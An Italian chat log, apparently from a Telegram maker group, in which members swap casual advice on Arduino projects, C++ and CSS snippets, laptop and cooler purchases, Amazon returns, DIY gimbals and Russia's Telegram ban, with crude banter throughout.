hai ragione, ho controllato...8.99€, sicuramente ha sbagliato a inserire il prezzo Marco
Ma che palle
Grazie mille
 risolvi
Niente...non mi caca
è all'università
Una tizia di GearBest così a caso mi ha inviato per email un Excel con 12 coupon esclusivi
Ah, rip
Come
rifai la build col case della cooler master so lo per il video e poi rimetti tutto nel tuo case
Volevo, ma ero obbligato a tenere per sempre
ma mica lo sanno loro, o sbaglio?
Quindi alla fine compro il psu e CM mi molla le periferiche
Seeeeeeh
ABBIAMO LE MAGLIETTE!!!
Eh poi si vede nei video
giusto...
ecco, quelle si che sono interessanti..che periferiche ti manda?
Ciao raga ho un problema, su Android si è bloccata la barra delle scorciatoie ( quella dove sta il wifi ecc...) È il touch funziona benissimo....
 per il psu quale modello avevi in mente?
banalmente..hai provato a riavviare?
Si ma già se blocco e sblocco schermo dopo 2-3 volte torna normale
Però è fastidioso
Habmesu Magliettem, fili mii! Ite, Overvolt est 
ABBIAMO LE MAGLIETTE!!!
Quello che mi consiglia Thanatos
🤔 un bel ripristino magari
cioè?
Non volevo ricorrere al ripristino...dovrei fare un backup o trasferire tutto al PC... Ma sembra che sono costretto
mi sa che è l'unico modo per risolvere purtroppo
Appena posso provo grazie
Prova ad entrare in modalità provvisoria...
Se hai un vetro temperato a volte capita che non prenda i bordi
Nessun vetro
Allora prima di ripristinare vai in modalità provvisoria... almeno per provare

Ragazzi mi si è bruciato un trasformatore, ho sostituito lo stabilizzatore che era apparentemente bruciato e ora non funziona lo stesso
Però non mostra altri segni di bruciatura
Controllato la tensione sul condensatore di livellamento?
A vedere così non sembra in buono stato la parte centrale del PCB...
Questa cosa è illegale, ancora peggio che l'iphone X
controlla gli elettrolitici, potrebbero essersi fottuti
Trovato: si è bruciata una fotoresistenza
fotoresistenza in un alimentatore? molto strano
Sarà l'opto sul feedback
Ma è un alimentatore stranissimo, l’ho preso da un dispositivo che ha messo su il mio antennista
questo avrebbe senso
L’ha cambiato proprio perchè si era bruciato questo alimentatore
Correggi il prezzo
Sono a lezione fino alle 1930
Eh ma se correggo sparisce l'immagine, ormai lasciamo così
Prima o poi sarà implementata nel bot la capacità di modificare i messaggi fatta bene
Allora avvisa con un post
Ci sono 7€ di differenza
Vendo tutto quello che vedete in foto... Gli Arduino sono originali ed uno è ancora nella scatola senza aprire
Contattatemi in privato
È possibile che Amazon mi abbia inviato un libro usato....c'è pure scritto in lapis dentro
Vi è mai capitato?
no ma in ogni caso reso o chiedi un rimborso parziale
No il reso no... però se lo volevo usato lo compravo a un mercatino...
meenchia, 90 anni indietro nel tempo?
why? 
Non mi servono più 
Ah
Se hai ordinato un libro nuovo chiedine uno nuovo
si capita, sicuramente è un reso..contatta l'assistenza e ti rimborsano
C++ qualcuno che mi da una mano?
Qualcuno che mi passa il modello 3d di un dildo fatto bene? Grazie
sono tentato dal fare una brutta battuta, ma mi tratterrò
Dai, sul serio ahaha
Lo devo stampare 3D
Comunque qualcuno sa dirmi come fare un programma che mi indichi tutti i numeri primi minori del numero inserito? C++
allora fai la domanda corretta: 
Ragazzi, qualcuno di voi ha il modello 3d del proprio pene da stampare?
così almeno cercheranno di aiutarti
Così mi sembra un po’ volgare da chiedere
Mi basterebbe il modello di un dildo fatto sul pc
ma è quello che ti manderanno
Meglio non chiedere direttamente xD
comunque, basta che googli ed è pieno di modelli 3d di un dildo
poi devi sceglierlo in base ai tuoi gusti
Grazie, ne cerco qualcuno
Il PLA va bene a contatto con la pelle o è dannoso?
comunque, non so se otterrai la stessa consistenza di quelli comprati, quindi magari valuta di comprarne uno che tanto costano poco
 🤣divertiti mandrillone🤣
Dici che è troppo duro di plastica?
ma
dipende come piace
Do un’occhiata anche qui, grazie 
messo benissimo mi dicono
forse, non conosco né il PLA né la consistenza dei dildi
Seriamente fai?
HAHAHAAHAHHAAHAHAH
Eh si
indovina chi gli ha dato il link
Vabbè sono donna
comunque prevedo una pioggia di cazzi in chat, non in 3d

Già ne ho tante di chat così ahaha
io non ho parole 
ahhh...
anche se dopo questa richiesta inizio a pensare che tu sia un troll
Perchè? Non sono gli uomini si masturbano eh
si, ma chiederlo in un gruppo con il 99% di ragazzi...
Poi non no mica detto che è per me
io l'avrei semplicemente cercato su google
comunque a parte gli scherzi, non usare ABS perchè è tossico..io ti consiglio di andare in un sexy shop se proprio non vuoi ordinarlo online (per questioni di privacy e per non fare prendere un infarto a mamma/nonna)..almeno li sei sicura che sono certificati per il contatto interno, le mucose sono parecchio delicate
Nei gruppi con le ragazze non sapevano neanche cos’era la stampante 3D
ah, è per la tua amica che non esiste? 


ma perché dovremmo avere dei dildi in 3d?
Mmh, vedrò cosa fare
No, è per me
 ancora sei cucciolo..fidati di zio Korry, a certe ragazze interessa parecchio l'argomento dildi/plug
Anche ad alcuni ragazzi :)
ti amo
conosco di persona un ragazzo che ne ha fatto un poggiacuffie
☺️
j <= sqrt(i) && i%j!=0

così non fa conti inutili, alla fine controllerai se i%j==0
parli del cazza di sicurezzo?
lo so..ho parecchi colleghi parrucchieri dell'altro "lato della staccionata" 

allora è vero che i parrucchieri hanno il vizietto 🤣🤣

dall'altro lato va bene... togli della staccionata 
verissimo..ne conosco personalmente almeno una 20ina
ma è più trendy così
Non non posso ...ho usato il bonus cultura...non posso essere rimborsato di nulla...dove sono i miei diritti...
Vabbè...un libro non si giudica dalla copertina...ma dentro c'è anche le briciole di un panino
ma tu contattala lo stesso e spiegagli la situazione (meglio la chat con l'oprratore, così puoi salvare la conversazione)..tranquillo che qualcosa ti rimborseranno, oppure ti offriranno qualche mese di Prime
Ok proverò...il prime lo ho già ma qualche mese mi farebbe comodo con quel che costa ora
appunto.. a me per una spedizione che mi ha perso il corriere mi hanno offerto rimborso completo più un mese di Prime, che schifo non fa
te lo dice da "i miei ordini"?
Si
aspè, un secondo, ti mando il link
Grazie
fallo da qui
Idem
seleziona il libro e poi scendi e metti "problemi con il mio ordine"
Mi apre la stessa pagina...
A ok
prova un secondo e fammi sapere
Vai grazie
 il Korry's Power colpisce ancora 

usa la chat con l'operatore e ricordati di salvarla..ti manderà la copia della conversazione sull'email
si si grazie
figurati
la signorina patrizia sta scrivendo
la mia di solito si chiama Mary oppure Amalia
reccmi, ho appena studiato tipo 60 pagine di storia dal 1517 al tipo 1616, è stato bello, torno a lavorare al crt
Si potrebbe fare in un modo più  facile,se vuoi trovare la somma dei numeri puoi avere un sum(0) += a;
Cioè  non capisco perché  fare quelle storie ah e forse ho capito male quello che vuoi fare.. ma sono sicuro che si puo fare in un modo piuq facile,anche con un funzione .-.
ok sono riuscito nel reso...chiedere un buono mi semprava troppo aprofittatore
Mi fido?
rAga  ,pavel durov ha detto "All the messengers suck,and the most sucks whatsapp"
si è il controllo di sicurezza dell'account
aok glio ho dato i dati e ho bloccato la carta da lapp...per sicurezza
hai fatto bene ma potevi stare tranquillo..è Amazon
quindi reso e rimborso oppure reso e invio libro nuovo?
reso
il rimborso mi sembrava da cani...per un libro
Pensavo avresti fatto una battuta sulla comparazione di durezze
eh ho capito..ma quindi ti mandano quello nuovo allora..di solito fanno così
Quanti ne hai stampati ehhh
si invio il mio e mi inviano il nuovo
zero purtroppo
perfect
Grazie anche a te...vali più di mille assistenti
pff..Google Assistant e Siri venivano a scuola da me, quei pivelli 
Mi immagino con la stampante a casa accanto ai genitori

Che dici, lo prendi il capacitivo?
Mica mi hai detto come va
Ragazzi diffidate di falcon, non paga gli aiuti
Se mi diffami così, stai fresco che ti pago sicuro!
Eh non te lo dirò mai!
Ahhahahaha
gente, ho trovato cose, COSE
quando per casa ti devi studiare la replicazione del dna ma tu cerchi soluzioni migliori di leggere 14 pagine del libro : 
cosa delle cose?🤔
è bellissima sta cosa
L'avessi saputo prima
mahonna, io ho cercato su youtube sperando tipo in un video di Dario Bressanini, altro che, questo è oro
Esiste una differenza di pericolosità tra le onde wi-fi 2.4 GHz e 5 GHz?
Intendo esposizione a onde radio e quindi probabilità di generare tumori e simili
Questa foto ve l’ho mandata nel 1984!
Stava caricando...
1200 di ping?!?!
Ahahaha
2.4 GHz sono più penetranti
Quindi più pericolose
Dopo uno studio, si è riscontrato che le onde radio a 2.4 e 5 GHz emanate dall'Access Point non sono assolutamente pericolose
Fonte?
Nop, entrambi i segnali sono non ionizzanti e con una potenza troppo bassa per causare danni (se rispetta le norme ovviamente)
Mh se lo dite voi
?
Se proprio vuoi leggiti la normatova che regolamenta tutti i dispositivi wifi (bgn802)
Vabbè è che volevo esserne sicuro
Grazie comunque
raga, come posso pulire del plexiglass
devo pulire i pannelli del mio case
il caro vecchio Vetril e un panno in microfibra, oppure una t-shirt vecchia..anche il Napisan spray è ottimo
ok, grazie, oerchè devo togliere le mie ditate 

allora vai di Vetril tranquillamente..non usare assolutamente uno sgrassatore con microparticelle perchè righeresti il plexy
ok
per me...carta vetrata ù-ù
ottimo 
 fabbro e falegname style
o anche dell'acido
si insomma, un goccetto di acqua ragia
e via, si strofina via 
tutto
tutto tutto
comunque....qualcuno mi dice come posso implementare in un codice la somma di valori esadecimali nel modo più ottimizzato possibile?
già visto su stack overflow?
naah, ora guardo, solo che deve essere un calcolo moolto veloce, del tipo che il mio arduino lo deve ripetere a 60Hz

Rulof Style 
e non si intende un solo valore, si intende tipo 20000 valori...sempre a 60hz

20000?
cosa devi fare?
meglio non chiedere..è peggio del Dr. Frankestein il caro Giulian
giusto 
devo sommare 2 matrici di esadecimali e mandarle in output sul crt a 60Hz di frequenza di sync, altrimenti mi si sfotte l'intero codice se non mantengo la giusta frequenza....nel senso...se non è a 60Hz vedi le peggio distorsioni sul crt
e il display è un 128x96, quindi tipo 14000 valori
scherzavo, 12288
maa fooorse riesco a restringere il campo di valori da sommare a un migliaio, devo lavorarci un pelo su, comunque il problema rimane
sto programmando super mario interamente con arduino connesso ad un crt in bianco e nero anni '40 ad una risoluzione di 128x96...è fighissimo sto coso
fiiigoo
già conmtrollato se esistonp librerie?
e con "sto programmando" intendo che devo ancora iniziare perchè non c'ho mai caxxi di aprire paint e disegnare i modelli della mappa e di mario
ci sta
c'è quella di TVOut, al momento uso quella per la conversione in RCA
ecco..come volevasi dimostrare 
però ho già preparato un po' di codice, ma non posso capire se funziona o no perchè mi servono 2 resistenze da mettere sui pin sync e video per sincronizzare l'immagine, ora come ora è triplicata sullo schermo e la vedi sfrecciare verso l'alto
hey, ho mandato in output trump l'altro giorno
The holy teachers



by 

avevo anche inviato una foto qua
here
la distorsione c'è, ma mi mancano le resistenze, la foto l'ho fatta usando lo slow motion dell's7 per farvi capire
cosa? 
altrimenti com'é? manda un video
altrimenti al secondo vedi 3 immagini, essenzialmente va verso l'alto a una velocità assurda e te vedi 3 immagini, avevo inviato un'altra immagine in cui si capiva
 mamma mia, Keledan mi sta proprio cadendo in basso..prestarsi anche alle comparsate con sti 2 coglioni
eccola qua, qua ci stanno solo 2 duplicazioni, comunque tipo così
Ragà ma se prendo un Google home mini e lo collego a ifft e poi lo collego ad un rashpberry posso fargli fare cose come un wake up lan ?
Io consiglio la cenere
Ti sono vicino in questo momento di sofferenza
Ti mando la mia?
ora esco anche la mia rete
ok, non trovo nulla, come cribbio si sommano i byte?
bho
se io ho tipo 0xff e 0xf8 per sparare 2 valori, come si fa la somma?
In che senso?
Titolo clickbait
in sostanza...questi valori sono tutti colori(grayscale) che vanno al monitor, io devo capire se tipo i 2 che devo sommare finiscono per dare un valore maggiore di "1" ossia che sono entrambi bene o male "bianco" allora diventa 0xff il risultato, altrimenti 0x0, questa era l'idea però a scuola non ho mai studiato come si sommano i byte o robba simile...e se l'ho fatto mi sarò rifiutato di ascoltare le lezioni
ma forse ho capito come fare
in teoria...se prendo un int diretto e li sommo mi esce un valore tra 0 e 255+255 massimo tipo...mmhh...provo con c++ ora
si, 0 e 510, almeno con cpp, ora mi basta un if() ed è fatta...credo...provo
Ma Google home è interfacciabile con ifttt?
Si
si, non google home ma google assistant
Google home = Google assistant??
google home è il dispositvo fisico, google assistant è il software assistente vocale
Ok Google home = Google assistant
A grandi linee
hanno fatto bloccare l'accesso dagli ISP, anche se Google e Apple ancora non l'hanno eliminato dallo store
E posso interfacciare ifttt con un rashpberry?
Google Home = altoparlante+microfono e Google Assistant integrato
si ci sono alcuni metodi, io ad esempio uso home assistant per la domotica e gli interfaccio sia direttamente google assistant ma volendo anche ifttt
Ed Arduino con una Ethernet shield??
con ifttt? si si puo integrare devi usare delle richieste get e post
Gg
Ma solo Arduino -> iftt o anche ifttt -> Arduino
sicuramente ifttt arduino
il contrario non so
Grazie
secondo voi, per un i5 7500, è meglio raffreddamento ad aria o a liquido all in one?
vorrei qualcosa di compatto
Gente con qualche magheggio sono riuscito a fare a meno di resistenze o altro
 see? Tra poco ci sarò riuscito, vedrai

Prezzo medio per un kit di sensori?
quando stai facendo i tuoi test ma ti crasha l'ide di arduino....fac....
dipende quali, comunque un buon kit sui 30/40 fino anche 60/70 euro
No troppo
Cinesoni a 5 euro per 20 sensori ne abbiamo?
È in sconto su banggood a 8,63 il kit di 37 sensori
dipende quanto puoi spendere
Ma neanche quello, per fare qualcosa di compatto per forza ad aria... Per quelli a liquido hai bisogno di ventole, waterblock, radiatore ecc
Cioè occupa molto più spazio
capito..quindi niente OC..che case hai?
Ma no non sono io 
Segno, che appena è pronto jl bot lo upgrado
ah ok :) beh, se vuoi qualcosa di economico ma migliore del dissipatore originale, vai di Arctic

il migliore neanche a dirlo è il Noctua, ma costa anche il doppio
Questo è ottimo
si ottimo, ma è gigantesco..lui me li ha chiesti piccoli e compatti
Ah k
Un cryorig low profile?
a liquido invece 
ragazzi
non riesco a capire come fare una cosa
a me piacciono le due linee che stanno tra filippo d'albero e il nerd della forza
però non capisco proprio come l'abbia fatta  so che ha usato bootstrap ma non trovo niente inerente nella documentazione
Ah che figo si possono ammonire i mod  Da quando in qua?
Intendi gli hr?
sì
Eh
ti faccio vedere come sono venuti a me
Fatteli uguali
e mica ci riesco 
Ma come li vuoi
Mi mandi una foto?
così
Trasparente
yep
è una cosa scema eh però dal css non me li vuole prendere
Metti all'hr un opacity di 0.6
vediamo
Ma quanto ha investito in questo drone?
Stima totale?
Riuscito?
.spaziatori {
    opacity: 40%;
    color: red;
  }
Ok
messo nel css, non me li prende 
L'hai messa la classe nell' HTML?
<hr class="spaziatori">
Hai linkato il file CSS?
sì
Woooo
Ri-wooooo
Figata entrambi 
Prova a vedere svuotando la cache e/o a vedere se qualche regola lo sovrascrive
Ehilà Marco! Sono appena stato ad una conferenza sulle fake news e sicurezza informatica. Penso che potrebbe essere un buon argomento per un video
Ora devo andare anyways domani ti do una mano meglio se vuoi
Diventa Mark Zuckerberg e dimentica tutto

ok !

ho provato a mettere dentro il html ma nulla :(
sto uscendo pazzo per una cosa così stupida
Lol
Riccardo scrivimi 
Comunque se hai bisogno conosco gente brava
mano cattiva  non si fa

da sempre, tempo fa quando non eravamo admin noi ci lanciavamo warn a caso 
Dici che si può ammonire la mano stessa?🤔
no, si possono ammonire i moderatori
È triste la vita

HAHAHA pavel durov ha detto che tutti succhiano,e cmq hanno bannato altre cose ma non telegram
LOL
Wow
Aria
Aria
Cazzutissimo
Inception
RAGA ma russia = idioti di merda ma hanno bannato tutto trane telegram....
Raga 
La mano non si comporta bene
La tua conoscenza del networking mi spiazza
xD
Telegram è bannato in Russia.
volevano
L'hanno fatto
in realtà la russia ha bannato server a caso mentre telegram continuava a cambiare ip
Però se usi una VPN non è colpa loro... Dovrebbero bannare tutti i provider di VPN e tutti gli hosting che hanno server all'estero...
Ah lol
Pensavo si connettessero con le VPN
sembra come quando provi ad uccidere una zanzara con una mitragliatrice senza preoccuparti se uccidi persone innocenti che passano di lì per caso
Certo che che merda non essere liberi su internet... E pensare che il parlamento americano ha votato a favore di ciò

Lo so,ma come capito tanta gente continua a usarlo
leggi il mio commento..TLC 2.0 sono io
RAGAZZI:
qualcuno mi consiglia il portatile più potente ed economico che conosca?
NON DEV’ESSERE DI MARCA!!
No
Stai chiedendo l'impossibile
Non ho capito l'ultima frase
Perché???
Se lo vuoi potentissimo sicuramente non sarà economico
Come fa a non essere di marca? Lo vuoi targato coop?
Non pretendo che sia Samsung o Apple
Se lo vuoi economico non sarà potente
Xiaomi mi pro
Certo scusate
Mi sono spiegato male: non pretendo marche note
Samsung non fa portatili, o si? Ed Apple non li fa potenti
Sono tutte note 
Se lo vuoi economico per una determinata fascia di potenza allora ci sono da fare un po' di ricerche
Hp, asus, dell, acer...
Mmm
Ok
Allora
Penso che comunque vai sopra ai 1000€ di spesa
Il più economico che sia decente?
Ma porca...
Cosa ci devi fare?
Comunque su 
 c'è un asus con la 1050 a 750€ tipo, solo che le recensioni sono pessime quindi non so se ti convenga cercarlo e prenderlo visto che in media varrebbe 1000€
Dipende tutto da questo
Acer con mx 150 a 650€
Ho un fisso
Ma mi pesa star senza o usare teamviwer ogni volta che parto
Dato che viaggio spesso
quanto vuoi spendere? nuovo oppure usato? e che tipo di uso devi farci?
In viaggio è molto comodo il tablet o un notebook leggero
Quanto buono?
niente è impossibile per lo Zio, ricordatelo 
Ok, ma dovrebbe dirci cosa ci deve fare, se no non possiamo aiutarlo 
ottima scelta
Abbastanza, almeno per la fascia di prezzo
togli tutte le marche elencate tranne Dell e qualche Asus
Vuole risparmiare
Spendere il meno possibile
Non devono girarci programmi troppo pesanti: al massimo atterra effects MASSIMO MASSIMO
altrimenti editor di testo
Arduino
Processing
perfetto..anche un usato in ottimo stato va bene oppure lo vuoi nuovo? solamente Amazon oppure anche altri store? layout tastiera ITA oppure va bene anche Internazionale? ovviamente con ssd, in caso da comprare a parte..budget massimo?
Usato va benissimo
appunto..per risparmiare mai andare su HP e Acer economici, sono sempre soldi buttati..piuttosto un Thinkpad usato
ok, dammi 5 minuti
Togli l'ssd che fa aumentare il prezzo
se è un portatile smontabile può prendere un Sata economico e montarlo dopo
Grazie mille
ah, un ultima cosa..diagonale del pannello? direi almeno un 15.6 a salire
Direi anche io. Se deve usare After Effects ci vuole
io punto sempre su un hdd classico, poi se c'è la combo ssd + hdd ad un prezzo conveniente va bene, altrimenti preferisco investire in altro
Si sì che va bene
Ma forse va bene anche più piccolo
Non troppo magari che altrimenti mi compro un tablet
Yep
Ok, io avevo in mente un paio di laptop ma mi sa che il prezzo é molto incompatibile
Anche se sono due laptop quasi top, questo bisogna dirlo
Forse in effetti un laptop Xiaomi non sarebbe male
Eh
Capisco che siano ottimi come qualità
Ma io che risparmio da tempo con i soldi che prendo facendo i lavoretti non me lo posso permettere
Thanks!
quanto puoi spendere massimo massimo? circa 500?
È da vedere
Meno spendo meglio è!
Per il resto mi arrangio
Penso di poteeci arrivare
Forse ci sono anche dei portatili da gaming di fascia medio-bassa che vanno bene e costano un po' meno delle controparti non da gaming
Io ho fatto così con il mio
Francè, tu che sei specializzato in grafica, Effects ha bisogno di dedicata oppure va bene anche un integrata per lavori basici?
Sarebbe estremamente meglio dedicata
Meglio ancora se Nvidia così usa CUDA
di solito gaming vuol dire costo di piu e valgo meno
Se no i tempi di rendering sono infiniti
una Quadro K1000 come la vedi?
Ragazzi
Ho trovato lo xiaomi mi pro scontato del 20%
A 600€
Ma non ho i soldi in 15 giorni
🤮🤮🤮🤮🤮
perfetto, ottimo pc
Eh
Ma 800 è troppo mi sa
Comunque lo tengo in considerazione
Ora vedo gli altri che mi avete consigliato
il Mi Pro è un ottimo pc, peccato per la tastiera internazionale
Mmm
io andrei su un mostriciattolo Dell..tanto se non devi farci grafica spinta vanno benissimo e sono indistruttibili
e facilmente smontabili, cosa molto buona
tipo questi ( te li metto in ordine di prezzo e potenza)
Guarda un po' di recensioni di Dave Lee sul tubo, mi sembra che porti portatili della tua fascia di prezzo a volte
A occhio non é full HD. Non é un must, ma usa after effects sarebbe meglio averlo
Korry, quanto potrebbe costare un dell XPS 15 modello vecchio?
la workstation HP sembra buona
É ancora ottimo come pc
quale anno?
Non so, ma il modello dovrebbe essere 9550
questo per uso ufficio e programmazione è fenomenale, lo uso in  laboratorio, è un missile..però come grafica è scarsino
🤔ITA oppure anche UK/US?
Penso ita
se ti accontenti di un ottimo modello i5, possiamo ragionarci.gli i7 sono fuori dal mondo secondo me
io te li mando comunque
  (questo è l'i5, e si può scegliere la tastiera: leggi la descrizione)
Ma non é per me, era per Seb 
   (questo è l'i7 top gamma, ma è UK, la tastiera ITA deve richiederla prima di comprarlo)
io fossi in lui opterei per il Mi Pro, oppure uno di questi 2 (ma costano parecchio), oppure la workstation HP usata..invece solamente per programmazione vanno benissimo i Dell Latitude che ho messo su
Penso che vada bene quello con i5 per lui
Hanno anche una scheda grafica decente
E l'ssd
si infatti, concordo
Se li becca in sconto ci sta
io prossimamente prenderò questo mostriciattolo in miniatura

Io ho preso il rog e deve durare almeno altri 7-8 anni con quello che ho speso 
Minchia
Quanto il mio portatile
i5 2430M e GT 540M, ancora vivo
Come è?
bello vero?
hai comunque preso un signor pc eh, mica un HP del Mediaworld
Se vuoi un PC senza GPU buono
A me serve per fl studio e fortnite principalmente
non è male, ha le nuove APU Ryzen..prendi un SSD Sata e vola
con Ryzen 2400 Fortnite gira bene, basta abbassare qualche dettaglio
Vabbè l'importante è che va
Alla fine prenderlo con gli stessi pezzi e montarlo ho visto però che non conviene
va benissimo tranquillo..se poi più in là ci vuoi piazzare dentro una 1050ti oppure una 1060 la regge ad occhi chiusi
tipo 30 minuti per un video da 3 
Okok, grazie mille
Mi piace come metafora... Me la rivendo
Grazie mano
Sono 10€ a riutilizzo
la cosa triste è che magari porteranno il 5g in tutte le città e lasceranno il resto del territorio senza neanche il 3g...
 grazie mille
Direi che il primo consigliato è ottimo!!!!
Si diffonderà come si è diffuso il 4G
 perfect
ovvero? Perché sono abbastanza sicuro che se andassi in montagna o al mare mi ritroverei a bestemmiare perché prende solo tim e male
ottima scelta, è il modello che comprerò anch'io
Ciao qualcuno sa cosa ha portato Marco come tesina di 5 superiore?
il segreto in montagna è avere un ottima antenna..ecco perchè i vecchi telefoni come il 3310 sono tutt'ora imbattibili in ricezione in montagna..certo non ci controlli Facebook, ma non ti lascia mai a piedi, neanche sul Monte Civetta oppure sulle Dolomiti
 svelaci l'arcano

ma se voglio farmi una vacanza in montagna non mi voglio isolare dal mondo perché gli isp si fanno i fighi solo in città
Capitalism
è più un essere fessi, il capitalismo dev'essere fatto bene
gli isp fanno quello che vogliono perché non hanno concorrenti (direi che sia evidente che fanno cartello)
in montagna usano il satellitare, è difficile che trovi l'antenna 5G, costerebbe troppo cablare..hai idea di quanto costa scavare km di fibra e montare un antenna 5G sul cucuzzolo? decine di migliaia di €
mi accontenterei anche del 3g o 4g
poi oh, il bello della vacanza in montagna è proprio quello, isolarsi dal mondo..altrimenti che vacanza è
almeno non sarei perennemente in roaming sulla tim in 2g

sei troppo vecchio
nessun ISP cablerà mai le montagne in 4G-5G, costa troppo e rende zero..non arriva il segnale RAI, figurati se arriva il 5G
è questo il vero problema, internet è ormai troppo importante e senza la connessione i luoghi di montagna subiscono un danno non indifferente
A casa mia non prende un cazzo
lo so, sono d'accordo con te, io sono un TLC, capisco benissimo il problema..solamente che agli ISP non interessa, loro puntano al guadagno e basta..è per questo che quel cancro chiamato TIM non ha intenzione minimamente di cablare le città in FTTH
che zona?
Algoritmo di Dijkstra
Molise
ma lo sanno tutti che il Molise non esiste 🤣
lo sta facendo
Periferia di Termoli
che operatore hai?
Non va con niente... Tim, Wind Vodafone
Solo Vodafone in un determinato punto
rete cellulare..e come adsl/fttc/wireless onde radio invece?
AAA🆘 Mi date uno sketch Arduino Nano- Oled 0.96  SPI??? devo testare il display ma non sono riuscito a trovarne uno che me lo fa funzionare. Anche con arduino mega. Graze.🆘
Ho scoperto un sito inglese che insegna come costruire macchinari utili a noi maker, soprattutto per risparmiare nella stampa 3d. un extruder per riciclare la plastica e creare i filamenti in casa. Fatto in casa, al contrario di quelli in commercio che costano un patrimonio! In settimana penso di mettermi all'opera, ma penso possa essere un buon progetto per 

Se linko il sito ottengo una segnalazione o posso farlo tranquillamente?
vai tranquillo, al limite la tolgo io
No dai non farti del male da solo...
Perché dovrei farmi del male?
Fare il filamento non è così banale
Stare in tolleranza è difficile con macchinari "casalinghi". Lasciamolo fare a chi ha le linee
Tentar non nuoce, se ci riesco, tanto di cappello!
Scaricate tutti rival region
È bellissimo
M A K E R S, ricorda
non molto
C'è chi si è fatto un microscopio qua dentro e altre cose (
 non so cosa tu stia cambiando in questo momento)
Penso Dijkstra
Se non ricordo male
Qualcosa puoi fare tipo fonderlo e colarlo in uno stampo.... Fare un filo è assurdo
Siamo attorno ai 1000 euro per il drone+gimbal....850 la Sony a6300 e altri 2500 tra assicurazione documentazione e abilitazione critica enac
Wow
Al momento sto andando verso la biblioteca con un po' di gente per fisica, comunque sali nelle immagini e vedi che cribbio sto facendo
Se vuoi ne costruiamo uno assieme...o anche in gimbal
Eh ma a capirlo
Crt + arduino = super mario e tekken tutto programmato sull'arduino usando la tastiera via seriale
Sapete indicarmi un gruppo per gli appassionati di computer
Farlo per "gioco" si fa. Farlo ottenendo risultati, e quindi materiale, decenti no.
Così sembra una sfida 
ragazzi scusate ma conviene comprare un Honor 6A PRO a 50 euro?
Vai vai
Il gimbal vorrei troppo costruirlo, però per la grossa canon
Nn c'è problema quanto pesa?
Conta che sul gimbal che vedi c'è la stessa gimbal che uso sul drone. Con un sistema a rotaie lo stacco da uno enoo attacco all'altro
Il frame l'ho fatto con meno di 40 euro di tubi di carbonio
Tutto il resto me lo sono stampato in pla
Un paio di ore di lavoro
Se lo vuoi fare per la Canon basta prendere i motori giustamente proporzionati
I motori fanno il prezzo immagino
Il gimbal vero e proprio 32bit 2 Imu sta sui 150
Compreso il frame dei 3 assi dell' gimbal
Visto che a te nn servirebbe da mettere sotto il fine secondo me con 250 c'è la puoi fare con il nostro amico Aliexpress
Sotto il drone
No la Canon sul drone non penso di fidarmi (quindi probabilmente ce la appenderò un paio di settimane dopo averlo costruito, conoscendomi)... Lo scopo principale sarebbe un gimbal handheld
Ma quanto pesa la cam?
Eh quando sono a casa la peso con l'obiettivo
Vabbè spannometrico 1 kiletto?
Spiegano anche come costruire il sistema di avvolgimento? Immagino di no...
Puoi scaricare il set guida con la spiegazione di ogni minimo dettaglio
lo sapevate?
Secondo Google sono 802g con l'obiettivo 10-18 che uso da vlog
Ma si potrebbe arrivare fino a 1.2kg se comprassi il 16-35 f2.8
Cosa?
 che ne pensi?
RAGAZZI
NEL GRUPPO SIAMO 564 membri
1€ a testa lo mettete per finanziarmi il pc ??

dobbiamo vedere se ci sono inattivi
sembra fatto apposta 
Ma io metto la differenza per quelli inattivi e coloro che giustamente non c’hanno voglia di aiutare un coglione come me
Cosa?
la parte gialla dello sfondo continua con quella dell'immagine
Qualcuno di voi ha il TV box di now TV?
Quello della roku
No, nessuno
Fa schifo, sul roku normale c'è il play store dove puoi installare le app, con il firmware di now TV ci sono tipo 20 app e basta
Fino a 1500 grammi riusciamo a stare sotto i 300 euro di core frame
Se poi vogliamo aggiungere monitor joystick controllo remoto bluetooth etc saliamo un po
Ma viene fuori un bel attrezzo
300 euro parlo di materiale. Se la vai a comprare ci vuole almeno 4-5 volte di piu
Se ne vogliamo parlare e hai un minuto ti lascio il numero e mi chiami
Da maker a maker
Il pezzo che costa di più e il motore dello yae
Yaw
Scrivimi pure in pvt qua su telegram, poi possiamo sentirci su Hangouts 
YouTube mostra quella schermata con dei placeholder (o almeno penso abbiano quelo scopo, poi dopo va a richiedere le miniature e i titoli dei video e li inserisce) grigi mentre carica tutti i video
l'ho scoperto oggi che è leggermente più lento a caricare
Mi hanno appena detto che per collegare lo schermo del  pc alla TV basta una USB
Ahahaha
Ma  quindi mi comprate il pc?
1€ a testa
Apro una richiesta su kickstarter

bella per te
Ragazzi qualcuno che mi sappia aiutare con degli esercizi di elettronica?
se guardi su ho mandato i modelli ieri
di più..circa 2 chili
no assolutamente no..100 volte meglio uno dei Dell che ti ho mandato su, e costano anche di meno, e hanno anche componenti aggiornati..questo è una fregatura
Ma va?
Mi sembra ovvio
Per esperienza fai prima a comprarlo...
sai se si potrebbe mettere il firmware originale?
Non saprei, dovresti provare a vedere se lo trovo e trovi il metodo per caricarlo
per caricarlo si potrebbe fare tramite il menu developer se non erro
i modelli?
Non credo 2 kg
è da qualche giorno che fa così mentre carica
scoperto oggi
io ho scoperto che su linux premendo § esce la lista delle shortcuts, ma su windows sembra non funzionare

si ho mandato ieri sera i dissipatori ad aria e anche un AIO economico

Banggood del caz**
ma cos
perchè?
colpa tua non di bangood, lo lasciano i postini quando non sei in casa
Tra 3 giorni compio un anno di attività su questo gruppo
No. Eravamo a casa in 3....
Domani ban
ah
ora vedo i link
?
ma non sono buone le caratteristiche?? ha anche lo schermo di 15.6"
allora il postino è uno sfaticato bastardo, ogni tanto lo fanno
è un 3210 quindi non è molto potente come processore ma soprattutto è un hp
ahaha va bene
Toh
Più che altro è l'i5 di 3 gen i probook non sono così male come materiali
a a a a genius
si, il postino di merda che consegna le raccomandate nella mia zona fa sempre cosi
lo hanno  minacciato di licenziarlo....
ma se ne frega
una mattina che andavo a scuola lui stava mettendo tutti gli avvisi di ritiro nelle cassette della posta mentre faceva colazione con la brioches

aspetta... mancano 4 ore e 17 minuti al compleanno del makers 
bene, domani ban generale a caso, facciamo 20 
 a quelli che capitano
.
Dovrebbero implementare un comando 
 che con una probabilità su 6 ti permabanna
Ma che tristezza
HAHAHAAHAHHAAHAHAHAHA
yeahh
yeeee
wow, figo
beh...ci sta
almeno hai una scusa per metterci un paio di bandiere russe nella descrizione che dimostrano ancor più il genere di gruppo
Oppure che banna un sesto del gruppo ogni volta 
che èèè meglioo
io direi di bannare tutti a parte i 3 più attivi
Uuuj
Pesante questa
Soprattutto perché verrebbe bannato anche il boss
ah... ooops 

